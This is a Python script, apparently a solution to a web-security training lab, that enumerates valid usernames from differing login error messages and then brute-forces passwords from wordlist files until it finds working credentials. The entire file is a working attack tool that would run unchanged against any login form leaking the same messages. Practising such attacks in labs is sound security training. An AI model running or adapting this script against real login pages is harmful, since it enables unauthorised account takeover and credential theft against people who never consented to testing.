import sys
import requests

def verify_if_lab_solved(url):

    response = requests.get(url + "/")

    if "you solved the lab!".lower() in response.text:
        print("[+] Solved the lab successfully")
    else:
        print("[!] LAB NOT SOLVED, please check manually once")

def bruteforce_username_and_pass(url):

    print()
    print(f"[*] Bruteforcing username and password")
    print()
    
    username_list = []
    password_list = []


    with open(sys.argv[2]) as users_file:
        username_list = users_file.readlines()

    with open(sys.argv[3]) as password_file:
        password_list = password_file.readlines()

    for user in username_list:

        user = user.strip()
        print(f"Checking username : {user}")

        for password in password_list:

            password = password.strip()

            print(f"Checking password : {password}")

            data = {
                "username": f"{user}",
                "password": f"{password}",
            }

            response = requests.post(url + "/login", data=data)
            
            if "invalid username" in response.text.lower():
                print("Invalid username. Continuing...")
                print("*" * 10)
                break
            
            else:

                print(f"Found username : {user}. Bruteforcing password")

                if "incorrect password" not in response.text.lower():
                    print("[+] Found username and password!")
                    print(f"Credentials : {data}")
                    return
                else:
                    print("Invalid password. Continuing...")


if __name__ == "__main__":
    if len(sys.argv) != 4:
        print('[+] Usage: python file.py https://website.net <users-file> <pass-file>')
    else:
        url = sys.argv[1].strip("/")
        bruteforce_username_and_pass(url)
        verify_if_lab_solved(url)
